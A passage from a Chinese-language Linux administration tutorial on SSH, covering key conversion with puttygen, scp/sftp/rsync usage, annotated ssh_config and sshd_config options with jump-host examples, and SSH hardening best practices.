</pre>
</div>

<p>
<b>转换-Mac系统</b>
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#23433;&#35013; putty</span>
brew install putty

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36890;&#36807;&#23558;&#23494;&#38053;&#36716;&#25442;&#20026;PuTTy ppk&#26684;&#24335;&#28982;&#21518;&#20877;&#36716;&#25442;&#20026;RSA-PEM</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#36716;&#25442;&#20026;ppk&#26684;&#24335;</span>
puttygen demo -o demo.ppk
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#36716;&#25442;&#20026;ras-pem&#26684;&#24335;</span>
puttygen demo.ppk -O private-openssh -o demo.pem
</pre>
</div>

<p>
<b>转换-windos</b>
</p>

<p>
安装putty，利用puttygen转换
</p>
</div>
</div>
</div>
<div id="outline-container-h:a7f543d6-c63b-48dd-9ed0-55b84c8c30a4" class="outline-4">
<h4 id="h:a7f543d6-c63b-48dd-9ed0-55b84c8c30a4">其它ssh客户端工具</h4>
<div class="outline-text-4" id="text-h:a7f543d6-c63b-48dd-9ed0-55b84c8c30a4">
</div>
<div id="outline-container-h:1cb8698c-5a45-4dc1-8368-a115aee1e43d" class="outline-5">
<h5 id="h:1cb8698c-5a45-4dc1-8368-a115aee1e43d">scp命令</h5>
<div class="outline-text-5" id="text-h:1cb8698c-5a45-4dc1-8368-a115aee1e43d">
<div class="org-src-container">
<pre class="src src-sh">scp [options] SRC... DEST/
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21069;&#38754;&#26159;&#28304;&#22320;&#22336;&#65292;&#21518;&#38754;&#26159;&#30446;&#26631;&#22320;&#22336;</span>
</pre>
</div>

<p>
两种方式：
</p>

<div class="org-src-container">
<pre class="src src-sh">scp [options] [user@]host:/sourcefile /destpath <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20174;&#36828;&#31243;&#25289;&#21462; &#36828;&#31243;&#26377;&#35835;&#26435;&#38480;</span>
scp [options] /sourcefile [user@]host:/destpath <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25512;&#36865;&#21040;&#36828;&#31243; &#36828;&#31243;&#26377;&#20889;&#26435;&#38480;</span>
</pre>
</div>

<p>
选项：
</p>

<pre class="example" id="orgfaf45ae">
常用选项
-C 压缩数据流
-r 递归复制
-p 保持原文件的属性信息
-q 静默模式
-P PORT 指明remote host的监听的端口

其它选项：
-1：使用ssh v1版本，这是默认使用协议版本
-2：使用ssh v2版本
-l limit：限制拷贝速度，Kbit/s.
-o ssh_option：指定ssh连接时的特殊选项，一般用不上。偶尔在连接过程中等待提示输入密码较慢时，可以设置GSSAPIAuthentication为no
-v：输出详细信息，可以用来调试或查看scp的详细过程，分析scp的机制
</pre>

<p>
范例
</p>

<div class="org-src-container">
<pre class="src src-sh">1.&#25226;&#26412;&#22320;&#25991;&#20214;/home/a.tar.tz&#25335;&#36125;&#21040;&#36828;&#31243;&#26381;&#21153;&#22120;192.168.0.2&#19978;&#30340;/home/tmp&#65292;&#36830;&#25509;&#26102;&#20351;&#29992;&#36828;&#31243;&#30340;root&#29992;&#25143;&#65306;
scp /home/a.tar.tz root@192.168.0.2:/home/tmp/

2.&#30446;&#26631;&#20027;&#26426;&#19981;&#20889;&#36335;&#24452;&#26102;&#65292;&#34920;&#31034;&#25335;&#36125;&#21040;&#23545;&#26041;&#30340;&#23478;&#30446;&#24405;&#19979;&#65306;
scp /home/a.tar.tz root@192.168.0.2

3.&#25226;&#36828;&#31243;&#25991;&#20214;/home/a.tar.gz&#25335;&#36125;&#21040;&#26412;&#26426;&#65306;
scp root@192.168.0.2:/home/a.tar.tz <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#25509;&#26412;&#22320;&#30446;&#24405;&#34920;&#31034;&#25335;&#36125;&#21040;&#24403;&#21069;&#30446;&#24405;</span>
scp root@192.168.0.2:/home/a.tar.tz /tmp <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25335;&#36125;&#21040;&#26412;&#22320;/tmp&#30446;&#24405;&#19979;</span>

4.&#25335;&#36125;&#36828;&#31243;&#26426;&#22120;&#30340;/home/&#30446;&#24405;&#21040;&#26412;&#22320;/tmp&#30446;&#24405;&#19979;&#12290;
scp -r root@192.168.0.2:/home/ /tmp

5.&#20174;&#36828;&#31243;&#20027;&#26426;192.168.100.60&#25335;&#36125;&#25991;&#20214;&#21040;&#21478;&#19968;&#21488;&#36828;&#31243;&#20027;&#26426;192.168.100.62&#19978;&#12290;
scp root@192.168.100.60:/tmp/copy.txt root@192.168.100.62:/tmp
</pre>
</div>
</div>
</div>
<div id="outline-container-h:1bca94c7-051f-4689-9dfa-5e4c271ff3ef" class="outline-5">
<h5 id="h:1bca94c7-051f-4689-9dfa-5e4c271ff3ef">sftp命令</h5>
<div class="outline-text-5" id="text-h:1bca94c7-051f-4689-9dfa-5e4c271ff3ef">
<p>
交互式文件传输工具，用法和传统的ftp工具相似，利用ssh服务实现安全的文件上传和下载
</p>

<p>
使用ls cd mkdir rmdir pwd get put等指令，可用？或help获取帮助信息
</p>

<div class="org-src-container">
<pre class="src src-sh">sftp [user@]host
sftp&gt; help
</pre>
</div>
</div>
</div>
<div id="outline-container-h:7679b67b-fa0f-4384-a700-5c692c81ee24" class="outline-5">
<h5 id="h:7679b67b-fa0f-4384-a700-5c692c81ee24">rsync 命令</h5>
<div class="outline-text-5" id="text-h:7679b67b-fa0f-4384-a700-5c692c81ee24">
<p>
基于ssh和rsync协议实现高效率的远程系统之间复制文件，使用安全的shell连
接做为传输方式，比scp更快，基于增量数据同步，即只复制两方不同的文件，
此工具来自于rsync包
</p>

<p>
注意：通信两端主机都需要安装rsync软件
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#26377;&#26080; / &#38382;&#39064;</span>
rsync -av /etc server1:/tmp     <span style="color: #b22222;">#</span><span style="color: #b22222;">&#22797;&#21046;&#30446;&#24405;&#21644;&#30446;&#24405;&#19979;&#25991;&#20214;</span>
rsync -av /etc/ server1:/tmp    <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21482;&#22797;&#21046;&#30446;&#24405;&#19979;&#25991;&#20214;</span>
</pre>
</div>

<p>
常用选项：
</p>

<pre class="example" id="orgb921adc">
-n 模拟复制过程
-v 显示详细过程
-r 递归复制目录树
-p 保留权限
-t 保留修改时间戳
-g 保留组信息
-o 保留所有者信息
-l 将软链接文件本身进行复制（默认）
-L 将软链接文件指向的文件复制
-u 如果接收者的文件比发送者的文件较新，将忽略同步
-z 压缩，节约网络带宽
-a 存档，相当于–rlptgoD，但不保留ACL（-A）和SELinux属性（-X）
--delete 源数据删除，目标数据也自动同步删除
</pre>

<p>
范例：更新有变化的文件，-u不覆盖新文件 <code>--delete</code> 同步删除
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#rsync -auv --delete /data/test 10.0.0.7:/data
</pre>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-h:dddf8665-1569-4ee2-9eaa-e62e0b0bfafc" class="outline-3">
<h3 id="h:dddf8665-1569-4ee2-9eaa-e62e0b0bfafc"><code>ssh_config</code>&#x2013;OpenSSH 客户端配置文件</h3>
<div class="outline-text-3" id="text-h:dddf8665-1569-4ee2-9eaa-e62e0b0bfafc">
<p>
参考： <a href="https://linux.die.net/man/5/ssh_config">https://linux.die.net/man/5/ssh_config</a>
</p>

<p>
ssh 从以下来源获取配置数据次序：
</p>
<ul class="org-ul">
<li>命令行选项</li>
<li>用户的配置文件 （~/.ssh/config）</li>
<li>系统范围的配置文件 （/etc/ssh/ssh_config）</li>
</ul>

<p>
<code>.ssh/config</code>
</p>

<div class="org-src-container">
<pre class="src src-sh">Host *
  StrictHostKeyChecking no <span style="color: #b22222;"># </span><span style="color: #b22222;">no &#31105;&#27490;&#39318;&#27425;&#36830;&#25509;&#30340;&#35810;&#38382;; &#40664;&#35748;yes &#19981;&#33258;&#21160;&#23558;&#20027;&#26426;&#23494;&#38053;&#28155;&#21152;&#21040; ~/.ssh/known_hosts &#25991;&#20214;</span>
  IgnoreUnknown UseKeychain
  UseKeychain yes
  AddKeysToAgent yes
  IdentityFile ~/.ssh/id_rsa
</pre>
</div>

<p>
<b>常用配置</b>
</p>
<dl class="org-dl">
<dt>Host</dt><dd>指定主机关键词，名称自定义。连接时 ssh 主机关键词 。可以是主机名、IP 地址，也可以使用通配符。* 代表所有主机，!否定匹配。匹配规则请参阅 <a href="https://man.openbsd.org/ssh_config#PATTERNS">PATTERNS</a></dd>
<dt>HostName</dt><dd>要登录的真实主机名。默认为命令行上给出的名称。</dd>
<dt>User</dt><dd>指定要登录的用户。默认为命令行上给出的用户</dd>
<dt>Port</dt><dd>指定远程主机的 SSH 服务端口，默认端口为 22</dd>
<dt>IdentityFile</dt><dd>指定用于身份验证的私钥文件路径。多个 IdentityFile 指令将添加到尝试的标识列表中</dd>
<dt>StrictHostKeyChecking</dt><dd>no 禁止首次连接的询问; 默认yes 不自动将主机密钥添加到 ~/.ssh/known_hosts 文件</dd>
<dt>RequestTTY</dt><dd>指定是否为会话请求伪 tty
<ul class="org-ul">
<li>yes：始终请求分配一个 TTY，即使在执行非交互式命令时也是如此。这在需要在远程主机上运行需要 TTY 的命令（如 sudo）时非常有用。</li>
<li>no：从不请求分配 TTY，即使在执行交互式命令时也不会分配 TTY。这在执行一些不需要 TTY 的脚本或命令时可以提高效率。</li>
<li>force：强制分配一个 TTY，即使在执行非交互式命令时也会分配 TTY。这与 yes 类似，但更严格。</li>
<li>auto：默认值。根据需要自动决定是否分配 TTY。如果执行的是交互式命令，则分配 TTY；如果执行的是非交互式命令，则不分配 TTY。</li>
</ul></dd>
<dt>RemoteCommand</dt><dd>指定在连接到远程主机时自动执行的命令</dd>
<dt>ProxyCommand</dt><dd>指定用于连接到服务器的命令。参数接受 <a href="https://man.openbsd.org/ssh_config#TOKENS">TOKENS</a> 部分中描述的令牌。可以方便地通过跳板机连接目标主机
<ul class="org-ul">
<li>如通过代理连接到A
<ul class="org-ul">
<li>ssh -oProxyCommand="ssh -q -W %h:%p JumpIP" -p 22 HostA
<ul class="org-ul">
<li>-q：静默模式</li>
<li>-W %h:%p：将目标主机的 IP 地址（%h）和端口（%p）转发到跳板机。%h 和 %p 会被 ssh 自动替换为目标主机的实际 IP 地址和端口。</li>
<li>JumpIP：跳板机的主机名或 IP 地址。</li>
</ul></li>
<li>ssh -oProxyCommand="ssh JumpIP 'nc %h %p' " -p 22 HostA</li>
</ul></li>
</ul></dd>
<dt>LocalCommand</dt><dd>本地命令</dd>
<dt>ServerAliveInterval</dt><dd>指定客户端定期向服务器发送心跳信号的时间间隔（单位为秒），默认值为 0，表示这些消息不会发送到服务器</dd>
<dt>Compression</dt><dd>指定是否启用数据压缩。对于带宽较低的网络连接，启用压缩可以提高传输效率。默认no</dd>
</dl>


<p>
范例：远程切换root
</p>

<div class="org-src-container">
<pre class="src src-sh">Host 120
     StrictHostKeyChecking no
     HostName 172.21.39.120
     User wvalianty
     IdentityFile ~/.ssh/wvalianty.pem
     ProxyCommand ssh -q -W %h:%p aws_entry <span style="color: #b22222;">#</span><span style="color: #b22222;">-q only required on Mac</span>
     RequestTTY yes
     RemoteCommand sudo su - <span style="color: #b22222;">#</span><span style="color: #b22222;">ssh 172.21.38.163 -o "RequestTTY=yes" sudo su -</span>

Host Bombay
        HostName 13.126.25.152
        User jumper
        IdentityFile /root/jumper.pem
        ServerAliveInterval 60
        Compression yes
Host 172.21.*
        StrictHostKeyChecking no
        ProxyCommand ssh -q -W %h:%p Bombay
        User cc
        IdentityFile /root/cc.pem
        ServerAliveInterval 60
        Compression yes
</pre>
</div>

<p>
LocalCommand
</p>

<p>
Specifies a command to execute on the local machine after successfully
connecting to the server. The command string extends to the end of the
line, and is executed with the user's shell. The following escape
character substitutions will be performed: '%d' (local user's home
directory), '%h' (remote host name), '%l' (local host name), '%n'
(host name as provided on the command line), '%p' (remote port), '%r'
(remote user name) or '%u' (local user name). This directive is
ignored unless
</p>

<p>
sshpass -p 123456 ssh -o StrictHostKeyChecking=no root@10.0.0.8
</p>
</div>
</div>
<div id="outline-container-h:0fa288e0-06bf-42ec-8d52-1b0c65cb65f6" class="outline-3">
<h3 id="h:0fa288e0-06bf-42ec-8d52-1b0c65cb65f6"><code>sshd_config</code>&#x2013;OpenSSH 服务端配置文件</h3>
<div class="outline-text-3" id="text-h:0fa288e0-06bf-42ec-8d52-1b0c65cb65f6">
<p>
官方文档：<a href="https://man.openbsd.org/sshd_config">https://man.openbsd.org/sshd_config</a>
</p>

<p>
服务器端：sshd
</p>

<p>
服务器端的配置文件: /etc/ssh/sshd_config
</p>

<p>
服务器端的配置文件帮助：man 5 sshd_config
</p>

<p>
常用参数：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">Port 22                # &#26381;&#21153;&#31471;SSH&#31471;&#21475;&#65292;&#21487;&#20197;&#25351;&#23450;&#22810;&#26465;&#34920;&#31034;&#30417;&#21548;&#22312;&#22810;&#20010;&#31471;&#21475;&#19978;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">ListenAddress 0.0.0.0  # &#30417;&#21548;&#30340;IP&#22320;&#22336;&#12290;0.0.0.0&#34920;&#31034;&#30417;&#21548;&#25152;&#26377;IP</span>
Protocol 2              <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#29992;SSH 2&#29256;&#26412;</span>


<span style="color: #b22222;">#</span><span style="color: #b22222;">----ssh&#36830;&#25509;&#31169;&#38053;&#20445;&#23384;&#20301;&#32622;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">HostKey for protocol version 1</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">HostKey /etc/ssh/ssh_host_key      # SSH 1&#20445;&#23384;&#20301;&#32622;/etc/ssh/ssh_host_key</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">HostKeys for protocol version 2</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">HostKey /etc/ssh/ssh_host_rsa_key  # SSH 2&#20445;&#23384;RSA&#20301;&#32622;/etc/ssh/ssh_host_rsa _key</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">HostKey /etc/ssh/ssh_host_dsa_key  # SSH 2&#20445;&#23384;DSA&#20301;&#32622;/etc/ssh/ssh_host_dsa _key</span>


<span style="color: #b22222;">#</span><span style="color: #b22222;">----&#26434;&#39033;&#37197;&#32622;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">PidFile /var/run/sshd.pid        # &#26381;&#21153;&#31243;&#24207;sshd&#30340;PID&#30340;&#25991;&#20214;&#36335;&#24452;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">ServerKeyBits 1024               # &#26381;&#21153;&#22120;&#29983;&#25104;&#30340;&#23494;&#38053;&#38271;&#24230;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">SyslogFacility AUTH              # &#20351;&#29992;&#21738;&#20010;syslog&#35774;&#26045;&#35760;&#24405;ssh&#26085;&#24535;&#12290;&#26085;&#24535;&#36335;&#24452;&#40664;&#35748;&#20026;/var/log/secure</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">LogLevel INFO                    # &#35760;&#24405;SSH&#30340;&#26085;&#24535;&#32423;&#21035;&#20026;INFO</span>
Banner /path/file                 <span style="color: #b22222;"># </span><span style="color: #b22222;">&#30331;&#24405;&#21518;&#25552;&#31034;&#20449;&#24687;</span>


<span style="color: #b22222;">#</span><span style="color: #b22222;">----&#20197;&#19979;&#39033;&#24433;&#21709;&#35748;&#35777;&#36895;&#24230;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">UseDNS yes                       # &#25351;&#23450;&#26159;&#21542;&#23558;&#23458;&#25143;&#31471;&#20027;&#26426;&#21517;&#35299;&#26512;&#20026;IP&#65292;&#20197;&#26816;&#26597;&#27492;&#20027;&#26426;&#21517;&#26159;&#21542;&#19982;&#20854;IP&#22320;&#22336;&#30495;&#23454;&#23545;&#24212;&#12290;&#40664;&#35748;yes&#12290;</span>
                                  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#30001;&#27492;&#21487;&#30693;&#35813;&#39033;&#24433;&#21709;&#30340;&#26159;&#20027;&#26426;&#39564;&#35777;&#38454;&#27573;&#12290;&#24314;&#35758;&#22312;&#26410;&#37197;&#32622;DNS&#35299;&#26512;&#26102;&#65292;&#23558;&#20854;&#35774;&#32622;&#20026;no&#65292;&#21542;&#21017;&#20027;&#26426;&#39564;&#35777;&#38454;&#27573;&#20250;&#24456;&#24930;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">GSSAPIAuthentication no          # &#26159;&#21542;&#24320;&#21551;GSSAPI&#36523;&#20221;&#35748;&#35777;&#26426;&#21046;&#65292;&#40664;&#35748;&#20026;yes</span>


<span style="color: #b22222;">#</span><span style="color: #b22222;">----&#20197;&#19979;&#26159;&#21644;&#23433;&#20840;&#26377;&#20851;&#30340;&#37197;&#32622;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">PermitRootLogin yes              # &#26159;&#21542;&#20801;&#35768;root&#29992;&#25143;&#30331;&#24405;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">PubkeyAuthentication yes         # &#26159;&#21542;&#24320;&#21551;&#22522;&#20110;key&#39564;&#35777;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">AuthorizedKeysFile  .ssh/authorized_keys  # &#22522;&#20110;&#20844;&#38053;&#35748;&#35777;&#26426;&#21046;&#26102;&#65292;&#26469;&#33258;&#23458;&#25143;&#31471;&#30340;&#20844;&#38053;&#30340;&#23384;&#25918;&#20301;&#32622;</span>
PasswordAuthentication yes        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26159;&#21542;&#20351;&#29992;&#29992;&#25143;&#21517;&#21644;&#23494;&#30721;&#36830;&#25509;&#65292;&#22914;&#26524;&#20351;&#29992;&#23494;&#38053;&#23545;&#39564;&#35777;&#21487;&#20197;&#20851;&#20102;&#23427;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">PermitEmptyPasswords no          # &#26159;&#21542;&#20801;&#35768;&#31354;&#23494;&#30721;&#65292;&#22914;&#26524;&#19978;&#38754;&#30340;&#37027;&#39033;&#26159;yes&#65292;&#36825;&#37324;&#26368;&#22909;&#35774;&#32622;no</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">MaxSessions 10                   # &#21516;&#19968;&#20010;&#36830;&#25509;&#26368;&#22823;&#20250;&#35805;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">LoginGraceTime 2m                # &#36523;&#20221;&#39564;&#35777;&#38454;&#27573;&#30340;&#36229;&#26102;&#26102;&#38388;&#65292;&#33509;&#22312;&#27492;&#36229;&#26102;&#26399;&#38388;&#20869;&#26410;&#23436;&#25104;&#36523;&#20221;&#39564;&#35777;&#23558;&#33258;&#21160;&#26029;&#24320;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">MaxAuthTries 6                   # &#25351;&#23450;&#27599;&#20010;&#36830;&#25509;&#26368;&#22823;&#20801;&#35768;&#30340;&#35748;&#35777;&#27425;&#25968;&#12290;&#40664;&#35748;&#20540;&#26159;6&#12290;</span>
                                  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#22833;&#36133;&#35748;&#35777;&#27425;&#25968;&#36229;&#36807;&#35813;&#20540;&#19968;&#21322;&#65292;&#23558;&#34987;&#24378;&#21046;&#26029;&#24320;&#65292;&#19988;&#29983;&#25104;&#39069;&#22806;&#26085;&#24535;&#28040;&#24687;&#12290;</span>
MaxStartups 10                    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26410;&#35748;&#35777;&#36830;&#25509;&#26368;&#22823;&#20540;&#65292;&#40664;&#35748;&#20540;10&#12290;&#26410;&#39564;&#35777;&#21363;&#36830;&#25509;&#19978;&#19981;&#29992;&#36755;&#20837;&#23494;&#30721;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">MaxStartups 10:30:200            #&#34920;&#31034;&#20174;&#31532;10&#20010;&#36830;&#25509;&#24320;&#22987;&#20197;30%&#30340;&#27010;&#29575;&#65288;&#36882;&#22686;&#65289;&#25298;&#32477;&#26032;&#36830;&#25509;&#65292;&#30452;&#21040;&#36830;&#25509;&#25968;&#36798;&#21040;200&#20026;&#27490;</span>
ClientAliveInterval 10            <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26381;&#21153;&#22120;&#31471;&#21521;&#23458;&#25143;&#31471;&#35831;&#27714;&#28040;&#24687; &#30340;&#26102;&#38388;&#38388;&#38548;&#65292;&#21333;&#20301;:&#31186;&#12290;0&#20026;&#19981;&#21457;&#36865;</span>
ClientAliveCountMax 3             <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26381;&#21153;&#22120;&#21457;&#20986;&#35831;&#27714;&#21518;&#23458;&#25143;&#31471;&#27809;&#26377;&#21709;&#24212;&#30340;&#27425;&#25968;&#36798;&#21040;&#19968;&#23450;&#20540;, &#23601;&#33258;&#21160;&#26029;&#24320;&#65292;&#40664;&#35748;3</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20197;&#19979;&#21487;&#20197;&#38480;&#21046;&#21487;&#30331;&#24405;&#29992;&#25143;&#30340;&#21150;&#27861;&#65306;</span>
AllowUsers user1 user2 user3
DenyUsers
AllowGroups
DenyGroups


<span style="color: #b22222;">#</span><span style="color: #b22222;">----&#20197;&#19979;&#21487;&#20197;&#33258;&#34892;&#28155;&#21152;&#21040;&#37197;&#32622;&#25991;&#20214;</span>
DenyGroups  hellogroup testgroup  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#34920;&#31034;hellogroup&#21644;testgroup&#32452;&#20013;&#30340;&#25104;&#21592;&#19981;&#20801;&#35768;&#20351;&#29992;sshd&#26381;&#21153;&#65292;&#21363;&#25298;&#32477;&#36825;&#20123;&#29992;&#25143;&#36830;&#25509;</span>
DenyUsers   hello test            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#34920;&#31034;&#29992;&#25143;hello&#21644;test&#19981;&#33021;&#20351;&#29992;sshd&#26381;&#21153;&#65292;&#21363;&#25298;&#32477;&#36825;&#20123;&#29992;&#25143;&#36830;&#25509;</span>


<span style="color: #b22222;">#</span><span style="color: #b22222;">----&#20197;&#19979;&#19968;&#39033;&#21644;&#36828;&#31243;&#31471;&#21475;&#36716;&#21457;&#26377;&#20851;</span>
<span style="color: #b22222;">###################################</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">GatewayPorts no                  # &#35774;&#32622;&#20026;yes&#34920;&#31034;sshd&#20801;&#35768;&#34987;&#36828;&#31243;&#20027;&#26426;&#25152;&#35774;&#32622;&#30340;&#26412;&#22320;&#36716;&#21457;&#31471;&#21475;&#32465;&#23450;&#22312;&#38750;&#29615;&#22238;&#22320;&#22336;&#19978;</span>
                                  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#40664;&#35748;&#20540;&#20026;no&#65292;&#34920;&#31034;&#36828;&#31243;&#20027;&#26426;&#35774;&#32622;&#30340;&#26412;&#22320;&#36716;&#21457;&#31471;&#21475;&#21482;&#33021;&#32465;&#23450;&#22312;&#29615;&#22238;&#22320;&#22336;&#19978;&#65292;&#35265;&#21518;&#25991;"&#36828;&#31243;&#31471;&#21475;&#36716;&#21457;"</span>
</pre>
</div>
</div>
<div id="outline-container-h:4b32adbb-31e6-406d-88de-e4a71d0dd750" class="outline-4">
<h4 id="h:4b32adbb-31e6-406d-88de-e4a71d0dd750">常用配置</h4>
<div class="outline-text-4" id="text-h:4b32adbb-31e6-406d-88de-e4a71d0dd750">
<div class="org-src-container">
<pre class="src src-sh">Port 65522                         <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26381;&#21153;&#31471;SSH&#31471;&#21475;&#65292;&#21487;&#20197;&#25351;&#23450;&#22810;&#26465;&#34920;&#31034;&#30417;&#21548;&#22312;&#22810;&#20010;&#31471;&#21475;&#19978;</span>
UseDNS no                       <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25351;&#23450;&#26159;&#21542;&#23558;&#23458;&#25143;&#31471;&#20027;&#26426;&#21517;&#35299;&#26512;&#20026;IP&#65292;&#20197;&#26816;&#26597;&#27492;&#20027;&#26426;&#21517;&#26159;&#21542;&#19982;&#20854;IP&#22320;&#22336;&#30495;&#23454;&#23545;&#24212;&#12290;&#40664;&#35748;yes&#12290;</span>
                                <span style="color: #b22222;"># </span><span style="color: #b22222;">&#30001;&#27492;&#21487;&#30693;&#35813;&#39033;&#24433;&#21709;&#30340;&#26159;&#20027;&#26426;&#39564;&#35777;&#38454;&#27573;&#12290;&#24314;&#35758;&#22312;&#26410;&#37197;&#32622;DNS&#35299;&#26512;&#26102;&#65292;&#23558;&#20854;&#35774;&#32622;&#20026;no&#65292;&#21542;&#21017;&#20027;&#26426;&#39564;&#35777;&#38454;&#27573;&#20250;&#24456;&#24930;</span>
GSSAPIAuthentication no         <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26159;&#21542;&#24320;&#21551;GSSAPI&#36523;&#20221;&#35748;&#35777;&#26426;&#21046;&#65292;&#40664;&#35748;&#20026;yes</span>
PermitRootLogin yes             <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26159;&#21542;&#20801;&#35768;root&#29992;&#25143;&#30331;&#24405;</span>
PubkeyAuthentication yes        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26159;&#21542;&#24320;&#21551;&#22522;&#20110;key&#39564;&#35777;</span>
AuthorizedKeysFile  .ssh/authorized_keys  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22522;&#20110;&#20844;&#38053;&#35748;&#35777;&#26426;&#21046;&#26102;&#65292;&#26469;&#33258;&#23458;&#25143;&#31471;&#30340;&#20844;&#38053;&#30340;&#23384;&#25918;&#20301;&#32622;</span>
PasswordAuthentication yes      <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26159;&#21542;&#20351;&#29992;&#29992;&#25143;&#21517;&#21644;&#23494;&#30721;&#36830;&#25509;&#65292;&#22914;&#26524;&#20351;&#29992;&#23494;&#38053;&#23545;&#39564;&#35777;&#21487;&#20197;&#20851;&#20102;&#23427;</span>
PermitEmptyPasswords no         <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26159;&#21542;&#20801;&#35768;&#31354;&#23494;&#30721;&#65292;&#22914;&#26524;&#19978;&#38754;&#30340;&#37027;&#39033;&#26159;yes&#65292;&#36825;&#37324;&#26368;&#22909;&#35774;&#32622;no</span>
</pre>
</div>

<p>
范例：设置ssh 空闲60s 自动注销
</p>

<div class="org-src-container">
<pre class="src src-sh">Vim /etc/ssh/sshd_config
ClientAliveInterval 60
ClientAliveCountMax 0

Service sshd restart
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#27880;&#24847;&#65306;&#26032;&#24320;&#19968;&#20010;&#36830;&#25509;&#25165;&#26377;&#25928;</span>
</pre>
</div>

<p>
范例：解决ssh登录缓慢的问题
</p>

<p>
ssh连接包括两个阶段：公钥交换阶段和登录验证阶段。这两个阶段都可能导致连接速度慢。
</p>

<p>
具体是哪个阶段的速度慢，完全可以通过肉眼看出来：
</p>
<ol class="org-ol">
<li>卡着很久才提示保存host key肯定是公钥交换过程慢。</li>
<li>主机验证完成后卡着很久才提示输入密码，肯定是登录验证过程慢。</li>
</ol>

<p>
其中公钥交换过程慢的原因，可能是网络连接慢、DNS解析慢等原因。网络连接
慢，ssh对此毫无办法，而DNS解析慢，ssh是可以解决的，解决方法是将ssh服务
端的配置文件中UseDNS设置为no(默认为yes)。
</p>

<p>
而登录验证慢的原因，则考虑ssh的身份验证顺序：
gssapi,host-based,publickey,keyboard-interactive,password。其中gssapi
认证顺序是比较慢的，所以解决方法一是在ssh客户端配置文件中将GSSAPI认证
机制给关掉，解决方法二是在ssh客户端配置文件中使用
PreferredAuthentications指令修改身份验证顺序。
</p>

<div class="org-src-container">
<pre class="src src-sh">vim /etc/ssh/sshd_config
UseDNS no
GSSAPIAuthentication no

systemctl restart sshd
</pre>
</div>

<p>
范例：在 ubuntu 上启用root 远程ssh登录
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#20462;&#25913;sshd&#26381;&#21153;&#37197;&#32622;&#25991;&#20214;</span>
vim /etc/ssh/sshd_config
<span style="color: #b22222;">#</span><span style="color: #b22222;">PermitRootLogin prohibit-password &#27880;&#37322;&#25481;&#27492;&#34892;</span>
PermitRootLogin yes &#20462;&#25913;&#20026;&#19979;&#38754;&#24418;&#24335;

systemctl restart sshd
</pre>
</div>

<p>
<b>ssh服务的最佳实践</b>
</p>

<ul class="org-ul">
<li>建议使用非默认端口</li>
<li>禁止使用protocol version 1</li>
<li>限制可登录用户</li>
<li>设定空闲会话超时时长</li>
<li>利用防火墙设置ssh访问策略</li>
<li>仅监听特定的IP地址</li>
<li>基于口令认证时，使用强密码策略，比如： <code>tr -dc A-Za-z0-9_ &lt;
  /dev/urandom ​| head -c 12|xargs</code></li>
<li>使用基于密钥的认证</li>
<li>禁止使用空密码</li>
<li>禁止root用户直接登录</li>
<li>限制ssh的访问频度和并发在线数</li>
<li>经常分析日志 /var/log/secure</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:281c4921-bf6b-413c-b8b5-118c111c7a0c" class="outline-3">
<h3 id="h:281c4921-bf6b-413c-b8b5-118c111c7a0c">ssh高级应用</h3>
<div class="outline-text-3" id="text-h:281c4921-bf6b-413c-b8b5-118c111c7a0c">
<p>
